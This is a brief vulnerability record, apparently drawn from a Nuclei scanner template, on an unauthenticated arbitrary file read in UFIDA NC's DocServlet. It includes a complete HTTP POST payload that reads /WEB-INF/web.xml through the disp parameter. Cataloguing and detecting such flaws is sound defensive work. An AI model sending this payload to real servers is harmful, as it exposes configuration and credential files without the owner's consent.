# Vulnerability: UFIDA NC - Arbitrary File Read
**Classification:** CWE-22,CWE-73
**Source:** Nuclei Template (`yonyou-nc-lfi.yaml`)

## Description
UFIDA NC is vulnerable to an arbitrary file read vulnerability in the nc.uap.lfw.file.action.DocServlet component. An unauthenticated remote attacker can exploit this flaw to read sensitive files on the server by sending crafted requests.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /service/~webrt/nc.uap.lfw.file.action.DocServlet HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

pageId=login&disp=/WEB-INF/web.xml
```

